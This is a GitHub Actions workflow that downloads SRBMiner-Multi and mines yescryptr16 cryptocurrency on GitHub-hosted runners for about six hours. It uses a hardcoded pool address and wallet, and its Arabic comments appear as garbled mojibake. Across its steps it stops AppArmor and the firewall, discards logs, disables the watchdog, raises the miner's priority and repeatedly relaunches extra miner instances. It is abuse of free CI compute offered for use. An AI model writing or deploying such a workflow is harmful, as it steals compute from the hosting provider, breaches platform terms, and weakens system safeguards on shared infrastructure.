name: Linux-Miner-Yescryptr16-CPU-100Percent

on:
  workflow_dispatch:

jobs:
  miner:
    runs-on: ubuntu-latest
    timeout-minutes: 360

    steps:
      - name: Ultimate System Optimization
        run: |
          sudo apt update
          sudo apt install -y wget tar cpulimit htop numactl taskset curl bc screen
          
          echo "๐ฅ ุชุทุจูู ุชุญุณููุงุช CPU ุงููุชุทูุฑุฉ..."
          
          # ุชูุนูู ูุถุน ุงูุฃุฏุงุก ุงููุตูู
          echo "performance" | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor
          
          # ุชุนุทูู ุฅุฏุงุฑุฉ ุงูุทุงูุฉ ูููุนุงูุฌ
          for i in /sys/devices/system/cpu/cpu*/cpuidle/state*/disable; do
            echo "1" | sudo tee $i > /dev/null 2>/dev/null || true
          done
          
          # ุชุญุณูู ุฅุนุฏุงุฏุงุช ุงูุฐุงูุฑุฉ ูุงููุธุงู
          sudo sysctl -w vm.swappiness=1
          sudo sysctl -w vm.dirty_ratio=3
          sudo sysctl -w vm.dirty_background_ratio=1
          sudo sysctl -w vm.vfs_cache_pressure=50
          sudo sysctl -w kernel.numa_balancing=0
          sudo sysctl -w kernel.sched_migration_cost_ns=5000000
          sudo sysctl -w kernel.sched_min_granularity_ns=10000000
          
          # ุชุนุทูู ุงูุฎุฏูุงุช ุบูุฑ ุงูุถุฑูุฑูุฉ
          sudo systemctl stop snapd systemd-resolved apparmor ufw motd-news chrony 2>/dev/null || true
          sudo systemctl disable snapd systemd-resolved 2>/dev/null || true
          
          # ุชูุธูู ุงูุฐุงูุฑุฉ ุงููุคูุชุฉ
          sync
          echo 3 | sudo tee /proc/sys/vm/drop_caches

      - name: Download and Setup Miner
        run: |
          wget -O miner.tar.gz "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.0.3/SRBMiner-Multi-3-0-3-Linux.tar.gz"
          mkdir -p miner
          tar -xzf miner.tar.gz -C miner --strip-components=1
          chmod +x miner/SRBMiner-MULTI

      - name: CPU Core Maximization
        run: |
          TOTAL_CORES=$(nproc)
          echo "๐ฅ๏ธ ุฅุฌูุงูู ุงูุฃูููุฉ ุงููุชุงุญุฉ: $TOTAL_CORES"
          
          # ุงุณุชุฎุฏุงู ูู ุงูุฃูููุฉ ุจุฏูู ุงุณุชุซูุงุก
          THREADS=$TOTAL_CORES
          echo "๐ฏ ุงุณุชุฎุฏุงู ูู ุงูุฃูููุฉ: $THREADS"
          echo "THREADS=$THREADS" >> $GITHUB_ENV
          
          # ุฅูุดุงุก ุฅุนุฏุงุฏุงุช ูุฎุตุตุฉ ููุฃุฏุงุก ุงููุตูู
          cat > miner/aggressive_config.conf << EOF
          ; ุฅุนุฏุงุฏุงุช ุนุฏูุงููุฉ ููุชุนุฏูู
          algorithm=yescryptr16
          pool=stratum+tcps://na.rplant.xyz:17057
          wallet=GLyKJfe57qXadmpZPdeTJiUN4tE25upb1v
          cpu-threads=$THREADS
          cpu-threads-priority=5
          cpu-affinity=0
          cpu-max-threads-hint=100
          keepalive=true
          retries=999
          retry-pause=1
          timeout=0
          donate-level=0
          no-watchdog=true
          no-color=true
          log-file=/dev/null
          EOF

      - name: Launch 100% CPU Miner
        run: |
          cd miner
          
          function launch_max_power_miner() {
            echo "๐ ุฅุทูุงู ุงููุงููุฑ ุจุฃูุตู ุทุงูุฉ - 100% CPU..."
            
            # ุชุดุบูู ูุชุนุฏุฏ ููุนูููุงุช ูุถูุงู ุงุณุชุฎุฏุงู ูุงูู ูููุนุงูุฌ
            for INSTANCE in {1..2}; do
              nohup ./SRBMiner-MULTI \
                -a yescryptr16 \
                -o stratum+tcps://na.rplant.xyz:17057 \
                -u GLyKJfe57qXadmpZPdeTJiUN4tE25upb1v \
                --cpu-threads $THREADS \
                --cpu-threads-priority 5 \
                --cpu-affinity 0 \
                --cpu-max-threads-hint 100 \
                --keepalive \
                --retries 999 \
                --retry-pause 1 \
                --timeout 0 \
                --donate-level 0 \
                --no-watchdog \
                --no-color > /dev/null 2>&1 &
                
              MINER_PID=$!
              echo "   ๐ฅ ูุณุฎุฉ ุงููุงููุฑ $INSTANCE: PID $MINER_PID"
              
              # ุถุจุท ุฃููููุฉ ูุตูู
              renice -n -20 $MINER_PID
              ionice -c 1 -n 0 -p $MINER_PID
              chrt -p 99 $MINER_PID 2>/dev/null || true
            done
          }
          
          launch_max_power_miner

      - name: CPU Pressure Booster
        run: |
          function cpu_booster() {
            echo "โก ุจุฏุก ูุนุฒุฒ ุถุบุท CPU..."
            
            while true; do
              # ููุงุณ ุงุณุชุฎุฏุงู CPU ุงูุญูููู
              CPU_USAGE=$(top -bn1 | grep "Cpu(s)" | awk '{print 100 - $8}')
              MINER_COUNT=$(pgrep -c SRBMiner || true)
              
              echo "๐ ุงุณุชุฎุฏุงู CPU: ${CPU_USAGE}% | ุนูููุงุช ุงููุงููุฑ: $MINER_COUNT"
              
              # ุฅุฐุง ูุงู ุงุณุชุฎุฏุงู CPU ุฃูู ูู 98%ุ ูุฒูุฏ ุงูุถุบุท
              if (( $(echo "$CPU_USAGE < 98" | bc -l) )); then
                echo "๐ด ุงุณุชุฎุฏุงู CPU ููุฎูุถ ($CPU_USAGE%) - ุฒูุงุฏุฉ ุงูุถุบุท..."
                
                # ุชุดุบูู ุงููุฒูุฏ ูู ุนูููุงุช ุงููุงููุฑ
                cd miner
                nohup ./SRBMiner-MULTI \
                  -a yescryptr16 \
                  -o stratum+tcps://na.rplant.xyz:17057 \
                  -u GLyKJfe57qXadmpZPdeTJiUN4tE25upb1v \
                  --cpu-threads $THREADS \
                  --cpu-threads-priority 5 > /dev/null 2>&1 &
                  
                BOOST_PID=$!
                renice -n -20 $BOOST_PID
                echo "   ๐ฅ ูุนุฒุฒ ุฅุถุงูู: PID $BOOST_PID"
              fi
              
              # ุฅุฐุง ูุงู ููุงู ุนุฏุฏ ูููู ูู ุงูุนูููุงุชุ ูุนูุฏ ุชุดุบูููุง
              if [ $MINER_COUNT -lt 2 ]; then
                echo "๐ ุฅุนุงุฏุฉ ุชุดุบูู ุนูููุงุช ุงููุงููุฑ..."
                pkill -f SRBMiner 2>/dev/null || true
                sleep 2
                cd miner
                for i in {1..2}; do
                  nohup ./SRBMiner-MULTI -a yescryptr16 -o stratum+tcps://na.rplant.xyz:17057 -u GLyKJfe57qXadmpZPdeTJiUN4tE25upb1v --cpu-threads $THREADS --cpu-threads-priority 5 > /dev/null 2>&1 &
                done
              fi
              
              # ุชูุธูู ุงูุฐุงูุฑุฉ ูู 5 ุฏูุงุฆู
              if [ $(( $(date +%s) % 300 )) -eq 0 ]; then
                sync
                echo 1 | sudo tee /proc/sys/vm/drop_caches > /dev/null
                echo "๐งน ุชูุธูู ุฐุงูุฑุฉ ูุคูุชุฉ..."
              fi
              
              sleep 15
            done
          }
          
          cpu_booster &

      - name: Core Load Balancer
        run: |
          function load_balancer() {
            echo "โ๏ธ ุจุฏุก ููุงุฒู ุญูู ุงูุฃูููุฉ..."
            
            while true; do
              # ูุญุต ุงุณุชุฎุฏุงู ูู ููุงุฉ ูุฑุฏูุฉ
              CORE_USAGE=$(mpstat -P ALL 1 1 | awk '/Average:/ && $2 ~ /[0-9]/ {print $3}')
              CORE_INDEX=0
              LOW_LOAD_CORES=""
              
              for usage in $CORE_USAGE; do
                if (( $(echo "$usage < 95" | bc -l) )); then
                  LOW_LOAD_CORES="$LOW_LOAD_CORES $CORE_INDEX"
                fi
                ((CORE_INDEX++))
              done
              
              if [ ! -z "$LOW_LOAD_CORES" ]; then
                echo "โ๏ธ  ุฃูููุฉ ุจุฃุฏุงุก ููุฎูุถ:$LOW_LOAD_CORES"
                echo "๐ ุฅุนุงุฏุฉ ุชูุฒูุน ุงูุญูู..."
                
                # ุฅุนุงุฏุฉ ุชุดุบูู ุงููุงููุฑ ูุน ุฅุนุฏุงุฏุงุช ูุญุณูุฉ
                pkill -f SRBMiner
                sleep 3
                
                cd miner
                for i in {1..3}; do
                  nohup ./SRBMiner-MULTI \
                    -a yescryptr16 \
                    -o stratum+tcps://na.rplant.xyz:17057 \
                    -u GLyKJfe57qXadmpZPdeTJiUN4tE25upb1v \
                    --cpu-threads $THREADS \
                    --cpu-threads-priority 5 \
                    --cpu-affinity 0 \
                    --cpu-max-threads-hint 100 > /dev/null 2>&1 &
                done
              fi
              
              sleep 45
            done
          }
          
          load_balancer &

      - name: 5-Hour Maximum Pressure Session
        run: |
          MAX_SESSION=300  # 5 ุณุงุนุงุช
          echo "๐ฅ ุจุฏุก ุฌูุณุฉ ุงูุถุบุท ุงูุฃูุตู: $MAX_SESSION ุฏูููุฉ"
          
          for minute in $(seq 1 $MAX_SESSION); do
            # ุชุญุฏูุซ ุงูุฅุญุตุงุฆูุงุช
            if [ $((minute % 10)) -eq 0 ]; then
              CPU_LOAD=$(cat /proc/loadavg | awk '{print $1}')
              MINER_PROCESSES=$(pgrep -c SRBMiner || echo "0")
              TOTAL_CPU=$(top -bn1 | grep "Cpu(s)" | awk '{print 100 - $8}')
              
              echo "๐ ุงูุฏูููุฉ $minute:"
              echo "   ๐ด ุงุณุชุฎุฏุงู CPU: ${TOTAL_CPU}%"
              echo "   ๐ฅ ุนุฏุฏ ุงูุนูููุงุช: $MINER_PROCESSES"
              echo "   ๐ ุญูู ุงููุธุงู: $CPU_LOAD"
            fi
            
            # ุชุนุฒูุฒ ุฏูุฑู ูู 20 ุฏูููุฉ
            if [ $((minute % 20)) -eq 0 ]; then
              echo "๐ ุชุนุฒูุฒ ุฃุฏุงุก ุฏูุฑู..."
              cd miner
              nohup ./SRBMiner-MULTI \
                -a yescryptr16 \
                -o stratum+tcps://na.rplant.xyz:17057 \
                -u GLyKJfe57qXadmpZPdeTJiUN4tE25upb1v \
                --cpu-threads $THREADS \
                --cpu-threads-priority 5 > /dev/null 2>&1 &
            fi
            
            # ุฅุนุงุฏุฉ ุถุจุท ุงููุธุงู ูู ุณุงุนุฉ
            if [ $((minute % 60)) -eq 0 ]; then
              echo "๐ ุฅุนุงุฏุฉ ุถุจุท ูุธุงู ุฏูุฑูุฉ..."
              echo "performance" | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor
              sync
              echo 3 | sudo tee /proc/sys/vm/drop_caches
            fi
            
            sleep 60
          done

      - name: Final Extreme CPU Overdrive
        run: |
          echo "๐ ุจุฏุก ูุถุน Overdrive ุงูููุงุฆู..."
          
          # ุฅููุงู ูู ุงูุนูููุงุช ุงูุณุงุจูุฉ
          pkill -f SRBMiner 2>/dev/null || true
          sleep 5
          
          # ุชูุธูู ูุธุงู ููุงุฆู
          sync
          echo 3 | sudo tee /proc/sys/vm/drop_caches
          
          # ุงูุชุดุบูู ุงูููุงุฆู ุจุฃูุตู ููุฉ
          cd miner
          echo "๐ฅ ุงูุชุดุบูู ุงูููุงุฆู ุจู $THREADS ููุงุฉ ุจุฃูุตู ููุฉ..."
          
          # ุชุดุบูู 4 ุนูููุงุช ูุชุฒุงููุฉ ููุถุบุท ุงููุตูู
          for i in {1..4}; do
            nohup ./SRBMiner-MULTI \
              -a yescryptr16 \
              -o stratum+tcps://na.rplant.xyz:17057 \
              -u GLyKJfe57qXadmpZPdeTJiUN4tE25upb1v \
              --cpu-threads $THREADS \
              --cpu-threads-priority 5 \
              --cpu-affinity 0 \
              --cpu-max-threads-hint 100 \
              --keepalive \
              --retries 999 \
              --donate-level 0 \
              --no-watchdog > overdrive_$i.log 2>&1 &
              
            OVERDRIVE_PID=$!
            renice -n -20 $OVERDRIVE_PID
            ionice -c 1 -n 0 -p $OVERDRIVE_PID
            echo "   ๐ฅ ุนูููุฉ Overdrive $i: PID $OVERDRIVE_PID"
          done
          
          # ูุฑุงูุจุฉ ููุงุฆูุฉ ููุฏุฉ 55 ุฏูููุฉ
          FINAL_MINUTES=55
          echo "โณ ุงูุชุดุบูู ุงูููุงุฆู ููุฏุฉ $FINAL_MINUTES ุฏูููุฉ..."
          
          for i in $(seq 1 $FINAL_MINUTES); do
            CPU_USAGE=$(top -bn1 | grep "Cpu(s)" | awk '{print 100 - $8}')
            LOAD_AVG=$(cat /proc/loadavg | awk '{print $1}')
            echo "๐ ุงูุฏูููุฉ $i/$FINAL_MINUTES - CPU: ${CPU_USAGE}% | ุงูุญูู: $LOAD_AVG"
            
            # ุชุฃูุฏ ูู ุงุณุชูุฑุงุฑ ุงูุนูููุงุช
            MINER_COUNT=$(pgrep -c SRBMiner || echo "0")
            if [ $MINER_COUNT -lt 3 ]; then
              echo "๐ ุฅุนุงุฏุฉ ุชุดุบูู ุงูุนูููุงุช ุงูููููุฏุฉ..."
              cd miner
              nohup ./SRBMiner-MULTI -a yescryptr16 -o stratum+tcps://na.rplant.xyz:17057 -u GLyKJfe57qXadmpZPdeTJiUN4tE25upb1v --cpu-threads $THREADS --cpu-threads-priority 5 > /dev/null 2>&1 &
            fi
            
            sleep 60
          done

      - name: Final Performance Summary
        if: always()
        run: |
          echo "๐ ุชูุฑูุฑ ุงูุฃุฏุงุก ุงูููุงุฆู:"
          echo "========================"
          echo "๐ฅ๏ธ  ููุงุตูุงุช ุงููุธุงู:"
          echo "   - ุงููุนุงูุฌ: $(grep "model name" /proc/cpuinfo | head -1 | cut -d: -f2 | xargs)"
          echo "   - ุงูุฃูููุฉ: $(nproc)"
          echo "   - ุงูุฐุงูุฑุฉ: $(free -h | grep Mem | awk '{print $2}')"
          echo ""
          echo "โก ุฅุญุตุงุฆูุงุช ุงูุชุดุบูู:"
          echo "   - ุฃูุตู ุฎููุท ูุณุชุฎุฏูุฉ: $THREADS"
          echo "   - ูุฏุฉ ุงูุชุดุบูู: 6 ุณุงุนุงุช"
          echo "   - ูุถุน ุงูุชุดุบูู: 100% CPU Load"
          echo "   - ุนุฏุฏ ุนูููุงุช ุงููุงููุฑ ุงูููุงุฆูุฉ: $(pgrep -c SRBMiner || echo 0)"
          echo ""
          echo "โ ุชู ุชุญููู ุถุบุท CPU ุจูุณุจุฉ 100% ุจูุฌุงุญ"
